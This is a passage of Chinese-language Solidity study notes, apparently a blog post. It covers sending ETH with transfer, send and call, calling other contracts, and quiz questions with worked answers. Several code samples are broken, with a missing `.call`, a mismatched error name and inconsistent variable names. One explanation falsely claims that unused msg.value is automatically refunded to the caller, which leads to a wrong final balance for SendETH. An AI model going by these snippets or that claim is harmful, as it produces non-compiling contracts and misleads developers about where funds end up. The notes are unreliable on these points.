函数只能在没有 msg.data 的情况下被调用。</li><li>由于 msg.data 不为空（0xaa），这次调用不会触发 receive() 函数。</li><li>合约也没有定义 fallback 函数，所以任何带有 msg.data 且没有匹配函数签名的调用将会导致交易失败。</li></ul><p><strong>结论</strong></p><p>这次调用将失败，并抛出错误，因为合约没有 fallback 函数来处理包含 msg.data 的调用。</p><p>所以会出现报错：error:’Fallback’ function is not defined, value和msg.data均发送失败</p><h3 id="发送ETH"><a href="#发送ETH" class="headerlink" title="发送ETH"></a>发送ETH</h3><ol><li><p><strong>transfer()</strong></p></li><li><p><strong>send()</strong></p></li><li><p><strong>call()，其中call()是被鼓励的用法。</strong></p></li></ol><p>首先构造发送ETH合约SendETH，并在其中实现payable的构造函数和receive()</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">contract SendETH&#123;</span><br><span class="line"></span><br><span class="line">//构造函数，payable使得部署的时候可以转eth进去</span><br><span class="line">    constructor() payable&#123;&#125;</span><br><span class="line">    //receive方法 接受eth时被触发</span><br><span class="line">    receive() external payable&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="1-transfer"><a href="#1-transfer" class="headerlink" title="1. transfer"></a>1. transfer</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.transfer(发送eth的数额)</span><br></pre></td></tr></table></figure><p>·    <strong>transfer()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p><p>·    <strong>transfer()<strong>如果转账失败（eg: amount&gt;value），会自动</strong>revert</strong>（回滚交易）。</p><p> amount：通常表示用户或合约希望发送的 ETH 的数量。这里 amount 是一个变量，表示转账时指定的具体金额（单位为 wei）。</p><p>value：指交易中随附的 ETH 数量，通常由 msg.value 表示。这是调用合约时由发送方附加的 ETH 数量，通常用于支付给其他地址或完成购买。value 只能在 payable 函数中被使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//用transfer()发送ETH,_to填reveive合约地址，amount填ETH转账金额</span><br><span class="line">function transferETH(address payable _to,uint256 amount) external payable&#123;</span><br><span class="line">_to.transfer(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-send"><a href="#2-send" class="headerlink" title="2. send"></a>2. send</h4><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.send(发送ETH数额)</span><br></pre></td></tr></table></figure><p>·    <strong>send()<strong>的</strong>gas</strong>限制是<strong>2300</strong>，足够用于转账，但对方合约的**fallback()<strong>或</strong>receive()**函数不能实现太复杂的逻辑。</p><p>·    <strong>send()<strong>如果转账失败，不会</strong>revert</strong>。</p><p>·    <strong>send()<strong>的返回值是</strong>bool</strong>，代表着转账成功或失败，需要额外代码处理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">error SendFailed(); // 用send发送ETH失败error</span><br><span class="line">// send()发送ETH</span><br><span class="line">function sendETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下send的返回值，如果失败，revert交易并发送error</span><br><span class="line">    bool success = _to.send(amount);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert SendFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="3-Call"><a href="#3-Call" class="headerlink" title="3.Call"></a><strong>3.Call</strong></h4><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">接收方地址.call&#123;value: 发送ETH数额&#125;(&quot;&quot;)</span><br></pre></td></tr></table></figure><p>·    <strong>call()<strong>没有</strong>gas</strong>限制，可以支持对方合约**fallback()<strong>或</strong>receive()**函数实现复杂逻辑。</p><p>·    <strong>call()<strong>如果转账失败，不会</strong>revert</strong>。</p><p>·    <strong>call()<strong>的返回值是</strong>(bool, bytes)<strong>，其中</strong>bool</strong>代表着转账成功或失败，需要额外代码处理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">error CallFAiled()// 用call发送ETH失败error</span><br><span class="line"></span><br><span class="line">// call()发送ETH</span><br><span class="line">function callETH(address payable _to, uint256 amount) external payable&#123;</span><br><span class="line">    // 处理下call的返回值，如果失败，revert交易并发送error</span><br><span class="line">    (bool success,) = _to.call&#123;value: amount&#125;(&quot;&quot;);</span><br><span class="line">    if(!success)&#123;</span><br><span class="line">        revert CallFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>·    <strong>call</strong>没有<strong>gas</strong>限制，最为灵活，是最提倡的方法；</p><p>·    <strong>transfer</strong>有<strong>2300 gas</strong>限制，但是发送失败会自动<strong>revert</strong>交易，是次优选择；</p><p>·    <strong>send</strong>有<strong>2300 gas</strong>限制，而且发送失败不会自动<strong>revert</strong>交易，几乎没有人用它。</p><h3 id="调用其他合约"><a href="#调用其他合约" class="headerlink" title="调用其他合约"></a>调用其他合约</h3><p><strong>如何调用</strong></p><p>​可以利用合约的地址和合约代码（或接口）来创建合约的引用：_Name(_Address)，其中_Name是合约名，应与合约代码（或接口）中标注的合约名保持一致，_Address是合约地址。然后用合约的引用来调用它的函数：_Name(_Address).f()，其中f()是要调用的函数。</p><h4 id="1-传入合约地址"><a href="#1-传入合约地址" class="headerlink" title="1.传入合约地址"></a>1.传入合约地址</h4><p>我们可以在函数里传入目标合约地址，生成目标合约的引用，然后调用目标函数。</p><p>以调用OtherContract合约的setX函数为例，我们在新合约中写一个callSetX函数，</p><p>传入已部署好的OtherContract合约地址_Address和setX的参数x：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address _address,uint256 x)external&#123;</span><br><span class="line">OtherContract(_Address).setX(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callSetX函数的参数中，成功调用后，调用OtherContract合约中的getX验证x变为123</p><h4 id="2-传入合约变量"><a href="#2-传入合约变量" class="headerlink" title="2.传入合约变量"></a>2.传入合约变量</h4><p>我们可以直接在函数里传入合约的引用，只需要把上面参数的<strong>address类型改为目标合约名</strong></p><p>比如上述的OtherContract</p><p>(ps: 该函数参数OtherContract _Address底层类型仍然是address，生成的ABI中、调用callGetX时传入的参数都是address类型)</p><p>例子： </p><p>通过传入合约变量调用目标合约的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(OtherContract _Address) external view returns(uint x)&#123;</span><br><span class="line">x = _Address.getX();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callGetX函数的参数中，调用后成功获取x的值</p><h4 id="3-创建合约变量"><a href="#3-创建合约变量" class="headerlink" title="3. 创建合约变量"></a>3. 创建合约变量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(address _Address) external view returns(uint x)&#123;</span><br><span class="line"></span><br><span class="line">//创建变量</span><br><span class="line">OtherContract oc = OtherContract(_Address);//oc为OtherContract别名</span><br><span class="line">x = oc.getX;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>复制OtherContract合约的地址，填入callGetX2函数的参数中，调用后成功获取x的值</p><h4 id="4-调用合约并发送ETH"><a href="#4-调用合约并发送ETH" class="headerlink" title="4.调用合约并发送ETH"></a>4.调用合约并发送ETH</h4><p>如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_Name(_Address).f&#123;value: _Value&#125;()</span><br></pre></td></tr></table></figure><p>其中**_Name<strong>是合约名，</strong>_Address<strong>是合约地址，</strong>f<strong>是目标函数名，</strong>_Value<strong>是要转的</strong>ETH<strong>数额（以</strong>wei**为单位）。</p><p><strong>OtherContract</strong>合约的<strong>setX</strong>函数是<strong>payable</strong>的，在下面这个例子中我们通过调用<strong>setX</strong>来往目标合约转账。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function setXTransferETH(address otherContract, uint256 x) payable external&#123;</span><br><span class="line">   OtherContract(otherContract).setX&#123;value: msg.value&#125;(x);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="利用call调用合约"><a href="#利用call调用合约" class="headerlink" title="利用call调用合约"></a>利用call调用合约</h3><p>call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, bytes memory)</code>，分别对应call是否成功以及目标函数的返回值。</p><p>不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数</p><p>当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数</p><p><strong>使用规则</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call(字节码);</span><br></pre></td></tr></table></figure><p>（其中字节码利用结构化编码函数abi.encodeWithSignature获得：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure><p><strong>函数签名为”函数名（逗号分隔的参数类型）”</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</span><br></pre></td></tr></table></figure><p>另外<code>call</code>在调用合约时可以指定交易发送的<strong>ETH</strong>数额和<strong>gas</strong>数额：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);</span><br></pre></td></tr></table></figure><p>利用Call调用合约举例</p><ol><li><strong>Response事件</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 定义Response事件，输出call返回的结果success和data,方便观察返回值</span><br><span class="line">event Response(bool success, bytes data);</span><br></pre></td></tr></table></figure><ol start="2"><li><p><strong>调用setX函数</strong></p><p>定义<strong>callSetX</strong>函数来调用目标合约的<strong>setX()<strong>，转入</strong>msg.value</strong>数额的<strong>ETH</strong>，并释放<strong>Response</strong>事件输出<strong>success</strong>和<strong>data</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callSetX(address payable _addr,uint256 x)public payable&#123;</span><br><span class="line"></span><br><span class="line">//同时还可发送eth,_addr是目标合约的地址</span><br><span class="line">(bool success,bytes memory data) = _addr&#123;value:msg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;, x)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">emit Response(success,data);//释放事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>​当我们此时调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。</p><ol start="3"><li><p><strong>调用getX函数</strong></p><p>所以我们还需要调用getX()函数用于返回目标合约X(uint256)的值</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function callGetX(address _addr) external returns(uint256)&#123;</span><br><span class="line">(bool success, bytes memory data) = _addr.call(</span><br><span class="line">//可以利用abi.decode来解码call的返回值data，并读出数值。</span><br><span class="line">        abi.encodeWithSignature(&quot;getX()&quot;));</span><br><span class="line">        </span><br><span class="line">        emit Response(success,data);</span><br><span class="line">        return abi.decode(data, (uint256));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从<code>Response</code>事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过<code>abi.decode</code>，最终返回值为5。</p><ol start="4"><li><strong>调用不存在的函数</strong></li></ol><p>如果给<code>call</code>输入的函数不存在于目标合约，那么目标合约的<strong>fallback</strong>函数会被触发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callNonExist(address _addr)external&#123;</span><br><span class="line"></span><br><span class="line">//call不存在的foo()函数</span><br><span class="line">(bool success, bytes memory data)=_addr.call(</span><br><span class="line">abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">emit Response(success,data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数</p><h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><ul><li>​下列关于事件的说法中，错误的是</li></ul><p>（选择一个答案） </p><p>A. Solidity中的事件（event）是EVM上日志的抽象。</p><p>B. 事件的声明由event关键字开头，然后跟事件名称。</p><p>C. 链上存储数据比存储事件的成本低。</p><p>D. 应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。</p><p><strong>解析：</strong></p><ul><li><strong>选项 A：正确。事件在 Solidity 中是 EVM 上日志的抽象，事件记录在链上日志中，但不直接参与合约逻辑。</strong></li><li><strong>选项 B：正确。事件的声明确实是通过 event 关键字定义的。</strong></li><li><strong>选项 C：错误。实际上，存储事件的成本比直接在链上存储数据要低，因为事件被存储在交易日志中，而不占用合约的存储空间，这降低了成本。</strong></li><li><strong>选项 D：正确。应用程序（如 ethers.js）可以通过 RPC 接口监听这些事件，并在前端作出相应的反应。</strong></li></ul><p>正确答案是：</p><p>C. 链上存储数据比存储事件的成本低。</p><p>​</p><ul><li>indexed关键字可以修饰任意类型的变量 选择一个答案 A. 正确 B. 错误</li></ul><p><strong>解析：</strong></p><p><strong>在 Solidity 中，indexed 关键字不能修饰任意类型的变量。最多只能对事件中的三个参数使用 indexed 修饰，并且它只适用于某些基本类型，例如 address、uint、int 和 bytes 等。复杂的结构体或数组类型无法被 indexed 修饰。</strong>所以错误。</p><ul><li>如果合约B继承了合约A，合约C要继承A和B，要怎么写？</li></ul><p> 选择一个答案</p><p> A. contract C is A, B</p><p> B. contract C is B, A</p><p> C. contract C is B</p><p><strong>父合约在子合约之前,A为正确选项</strong></p><p>合约B继承了合约A，两个合约都有pop()函数，下面选项中，正确调用父合约函数的是：</p><p> 选择一个答案 </p><p> A. A.pop();</p><p> B. super.pop();</p><p> C. 都正确</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，当子合约 B 继承了父合约 A，并且两个合约中都存在同名函数 pop() 时，可以通过以下两种方式调用父合约的 pop() 函数：</strong></p><p>·    <strong>A.pop();：直接通过父合约的名称调用父合约的 pop()。</strong></p><p>·    <strong>super.pop();：使用 super 关键字调用父合约的 pop()，特别适合在多重继承的情况下调用父类函数。</strong></p><p><strong>因此，两种方式都可以正确调用父合约的 pop() 函数,选C</strong></p><ul><li>function a() public override{} 意思是</li></ul><p>​选择一个答案 </p><p>​A. 希望子合约重写函数a()</p><p>​B. 函数a()重写了父合约中的同名函数</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，override 关键字表示该函数是对父合约中同名函数的重写。因此，function a() public override {} 的意思是 该函数 a() 重写了父合约中的同名函数。</strong></p><ul><li>合约B继承了合约A，下面选项中，正确调用父合约构造函数的是：</li></ul><p>​A. constructor(uint _num) { A(_num);} </p><p>​B. constructor(uint _num) { A.constructor(_num);}</p><p>​C. constructor(uint _num) A(_num){}</p><p><strong>解析：</strong></p><p><strong>在 Solidity 中，如果合约 B 继承了合约 A，并且需要在合约 B 的构造函数中调用合约 A 的构造函数，正确的写法是 constructor(uint _num) A(_num){}。</strong></p><ul><li>被导入文件中的全局符号想要被其他合约单独导入，应该怎么编写？</li></ul><p>（选择一个答案<strong>）</strong></p><p>​A. 将合约结构包含</p><p>​B. 包含在合约结构中</p><p>​C. 与合约并列在文件结构中</p><p><strong>解析</strong></p><p><strong>当文件中的全局符号（例如函数、结构体、枚举等）希望被其他合约单独导入时，需要将这些符号定义在合约之外，即与合约并列在文件结构中，而不是包含在特定合约的内部。</strong></p><p><strong>这样一来，这些符号就在文件的全局作用域中，便于其他文件或合约通过 import 语句直接导入和使用，选C。</strong></p><ul><li><p>Solidity中import的作用是：</p><p> A. 导入其他合约中的接口</p><p>B. 导入其他合约中的私有变量 </p><p>C. 导入其他合约中的全局符号 </p><p>D. 导入其他合约中的内部变量</p></li></ul><p><strong>解析</strong></p><p><strong>在 Solidity 中，import 关键字用于导入其他文件中定义的全局符号，如合约、库、结构体、枚举等。这使得开发者可以在当前文件中使用其他文件中的符号。</strong></p><p><strong>选项分析：</strong></p><p>·    <strong>A. 导入其他合约中的接口：虽然可以导入接口，但 import 并不限于接口。</strong></p><p><strong>·    B. 导入其他合约中的私有变量：私有变量不能在其他合约中直接访问，import 不能导入私有变量。</strong></p><p><strong>·    C. 导入其他合约中的全局符号：这是正确答案，因为 import 可以导入各种全局符号。</strong></p><p><strong>·    D. 导入其他合约中的内部变量：import 不能直接导入内部变量（internal 变量），但可以通过继承的方式访问。</strong></p><p><strong>因此，正确答案是 C。</strong></p><ul><li>以下import写法错误的是：</li></ul><p>​ A. import from “.&#x2F;Yeye.sol”;</p><pre><code> B. import &#123;Yeye&#125; from &quot;./Yeye.sol&quot;;  C. import &#123;Yeye as Wowo&#125; from &quot;./Yeye.sol&quot;;   D. import * as Wowo from &quot;./Yeye.sol&quot;;</code></pre><p><strong>解析</strong></p><p>*<em>在 Solidity 中，import 语句需要指定导入内容或者使用通配符 * 进行导入。选项 A 缺少导入的具体内容，这是错误的写法。正确的写法应当明确指定要导入的符号或使用通配符 <em>。</em></em></p><p><strong>选项分析：</strong></p><p><strong>·    A. import from “.&#x2F;Yeye.sol”;：错误。未指定导入的内容，语法不完整。</strong></p><p><strong>·    B. import {Yeye} from “.&#x2F;Yeye.sol”;：正确。导入了 Yeye 合约。</strong></p><p><strong>·    C. import {Yeye as Wowo} from “.&#x2F;Yeye.sol”;：正确。导入并将 Yeye 别名为 Wowo。</strong></p><p><strong>·    D. import * as Wowo from “.&#x2F;Yeye.sol”;：正确。导入 Yeye.sol 中所有符号，并以 Wowo 作为命名空间。</strong></p><p>  什么是命名空间？</p><p>​命名空间帮助开发者将相关的功能或数据组织在一起，使得代码逻辑更加清晰。</p><p>​通过命名空间的前缀，开发者可以快速了解某个标识符的来源和用途。</p><p><strong>因此，A 是错误的导入写法。</strong></p><ul><li><p>import导入文件中的全局符号可以单独指定其中的： </p><p> A. 合约</p><p> B. 纯函数</p><p> C. 结构体类型</p><p> D. 以上都可以</p></li></ul><p><strong>解析</strong></p><p>​ <strong>在 Solidity 中，import 语句可以单独指定要导入的符号，包括合约、函数、结构体等。例如：</strong></p><p><strong>·    合约：可以通过 import { ContractName } from “file.sol”; 来导入文件中的特定合约。</strong></p><p><strong>·    纯函数：如果文件中定义了 pure 或 view 的全局函数（从 Solidity 0.6.0 开始支持的功能），也可以通过 import { functionName } from “file.sol”; 来单独导入。</strong></p><p><strong>·    结构体类型：可以使用 import { StructName } from “file.sol”; 来单独导入结构体定义。</strong></p><p><strong>因此，D. 以上都可以 是正确答案。</strong></p><p>* </p><p><img src="https://s2.loli.net/2024/11/18/BycbYiXFE24tvnG.png" alt="2.png"></p><p><strong>解析</strong></p><p>假设 SendETH 合约中 callETH 函数的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function callETH(address payable _to) external payable &#123;</span><br><span class="line"></span><br><span class="line">  // 假设发送 1ETH 给 ReceiveETH 合约</span><br><span class="line"></span><br><span class="line">  (bool success, ) = _to.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">  require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这种情况下，以下是执行步骤和各合约的 ETH 余额变化：</p><p> <strong>交易初始化</strong>：Vitalik 调用 SendETH 合约的 callETH 函数，没有设置 msg.value。SendETH 合约接收到 2 ETH。</p><p> <strong>转账执行</strong>：callETH 函数内部使用了 call{value: 1 ether}(“”)，向 ReceiveETH 合约发送 1 ETH。因此，ReceiveETH 合约将接收到 1 ETH，SendETH 合约的余额减少 1 ETH。</p><p><strong>最终余额</strong>：</p><p>o  SendETH 合约：2 ETH（初始接收） - 1 ETH（发送） &#x3D; 1 ETH</p><p>o  ReceiveETH 合约：接收 1 ETH</p><p>由于没有设置msg.value，执行完交易后，SendETH 合约的余额为 <strong>1 ETH</strong>，而 ReceiveETH 合约的余额为 <strong>1 ETH</strong>。</p><p><strong>如果设置了msg.value，则SendETH为0ETH，</strong></p><p>这是因为 msg.value 是直接随交易发送到 SendETH 合约的，以支付调用 callETH 函数的资金。这笔 2 ETH 会被发送到 SendETH 合约，但 SendETH 合约并不保留这 2 ETH，而是立即在 callETH 函数中使用其中的 1 ETH 进行转账，剩余的 1 ETH 也不被 SendETH 合约保留。</p><p>以下是更详细的解释：</p><ol><li><p><strong>初始交易的 2 ETH</strong>：Vitalik 发送的 msg.value 是 2 ETH，这笔资金在调用 SendETH 合约的 callETH 函数时传入。</p></li><li><p><strong>发送 1 ETH 给 ReceiveETH</strong>：callETH 函数中使用了 call{value: 1 ether}(“”) 向 ReceiveETH 合约转账 1 ETH。</p></li><li><p><strong>剩余的 1 ETH</strong>：由于 callETH 函数中并没有将剩余的 1 ETH 存入 SendETH 合约的余额（例如未将 msg.value - 1 ether 显式存入），交易结束时，这部分 1 ETH 会被直接退还给调用者（Vitalik），因为 Solidity 中的函数执行完毕后未被使用的 msg.value 会被退还。</p></li></ol><p><strong>总结</strong></p><p>因此，交易完成后：</p><p>·    SendETH 合约没有余额，余额为 <strong>0 ETH</strong></p><p>·    ReceiveETH 合约收到并保留了 1 ETH</p><ul><li><p>下列关于智能合约调用其他智能合约的说法，正确的一项是：</p><p> 选择一个答案</p><p> A. 智能合约调用其他智能合约这一功能，主要起到了方便代码复用的作用</p><p> B. 在智能合约A中调用智能合约B，比起从EOA直接调用智能合约B，要更节省gas </p><p> C. 智能合约B中可见性为internal的函数也可以被智能合约A调用</p></li></ul><p><strong>解析</strong></p><p>· <strong>选项 A 是正确的。智能合约调用其他智能合约确实可以方便代码复用。这样可以减少重复代码并提高合约的模块化，使开发更加灵活和高效。</strong></p><p><strong>· 选项 B 是不正确的。在智能合约 A 中调用智能合约 B 实际上比直接从外部账户（EOA）调用智能合约 B 消耗更多的 Gas，因为这涉及到更多的操作步骤（合约 A 需要发起外部调用），并没有节省 Gas 的效果。</strong></p><p><strong>· 选项 C 是不正确的。internal 可见性表示函数只能在同一个合约或继承的合约中调用，不能被其他合约直接调用。因此，合约 A 无法直接调用合约 B 中 internal 的函数。</strong></p><ul><li>下面哪种使用方式不正确？</li></ul><p>​A. address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”)); </p><p>​B. address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”)); </p><p>​C. address.call{gas: 1000000, value: 1 ether} </p><p>​D. address(nameReg).call{gas: 1000000, value: 1 ether}</p><p>​</p><p><strong>解析</strong></p><p>逐一分析</p><p> <strong>选项 A：address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p><p>o 这是正确的写法，使用了 .call{gas: …} 发送指定的 gas 量，并通过 abi.encodeWithSignature 来对函数调用参数进行编码。此调用会尝试在 nameReg 地址处调用 register(string) 函数，提供字符串 “MyName” 作为参数。</p><p><strong>选项 B：address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p><p>o 这是正确的写法，使用了 .call{value: …} 发送指定的 value（即 1 ether），并且使用了 abi.encodeWithSignature 对函数和参数进行编码。</p><p>o 该调用会在发送 1 ether 的情况下，尝试调用 nameReg 地址上的 register(string) 函数。</p><p> <strong>选项 C：address.call{gas: 1000000, value: 1 ether}</strong></p><p>o 这是不正确的写法。address.call{…} 的语法要求提供被调用的目标地址，而这里没有指定有效地址和编码的数据。正确写法应为 address(target).call{gas: …, value: …}(data)。</p><p>o 这里 address 作为数据类型使用是不对的，应该是一个具体的地址实例，比如 address(target)。</p><p> <strong>选项 D：address(nameReg).call{gas: 1000000, value: 1 ether}</strong></p><p>o 这是正确的写法，因为 address(nameReg).call{gas: …, value: …}(data) 提供了 gas 和 value，并调用 nameReg 这个合约地址。</p><p><strong>因此，C 是错误的使用方式，因为它缺少了有效的地址实例（目标地址）和调用的数据。</strong></p><p><img src="https://s2.loli.net/2024/11/18/EYM5s4byNx2dROt.png" alt="3.png"></p><p><strong>解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OtherContract other = OtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure><p>o 这种写法直接实例化了 OtherContract 合约。因为 OtherContract 合约实现了 IOtherContract 接口，这种写法允许我们调用 OtherContract 中的所有公共函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IOtherContract other = IOtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure><p>o 这种写法使用了 IOtherContract 接口进行实例化，可以用来调用 IOtherContract 中声明的函数。只要 OtherContract 实现了 IOtherContract 接口，这种方式也是正确的。</p><p>因此，**(1) 和 (2) 均是正确的调用方式**，可以使用任意一种方法来调用合约。</p><p><img src="https://s2.loli.net/2024/11/18/lPv1sNgO5QoMCUn.png" alt="4.png"></p><p><strong>解析</strong></p><p><strong>· 选项 A：MyContract 是 OtherContract 的子类</strong></p><p><strong>o 不正确。MyContract 并没有继承 OtherContract，它只是实例化了 OtherContract 并通过地址直接调用它的函数，因此不构成继承关系。</strong></p><p><strong>· 选项 B：MyContract 是 IOtherContract 的一个实现</strong></p><p><strong>o 不正确。MyContract 也没有实现 IOtherContract 接口。它只是定义了与 OtherContract 交互的函数，而不是实现 IOtherContract 中的所有接口。</strong></p><p><strong>· 选项 C：MyContract 需要 0xd9145CCE52D386f254917e481eB44e9943F39138 的某种许可，才可以调用其中的函数</strong></p><p><strong>o 不正确。只要 OtherContract 中的函数是 external 或 public 且无访问权限限制，任何合约或外部账户都可以调用它。OtherContract 中的 setX 和 getX 都没有额外的权限控制。</strong></p><p><strong>· 选项 D：MyContract 的函数 call_setX 可以实现，这意味着 OtherContract 中 setX 的权限没有门槛，存在安全隐患</strong></p><p><strong>o 正确。OtherContract 的 setX 函数是 external 并且没有权限控制，因此任何合约或账户都可以调用并修改 _x 的值。这确实可能带来安全隐患，尤其是在 _x 变量值的更改可能影响合约逻辑的情况下。如果不希望外部随意调用，应该在 setX 函数中添加访问控制。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> solidity </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>区块链安全基础二</title>
      <link href="/2024/11/10/%E9%93%BE%E5%AE%89%E5%9F%BA%E7%A1%802/"/>
      <url>/2024/11/10/%E9%93%BE%E5%AE%89%E5%9F%BA%E7%A1%802/</url>
      
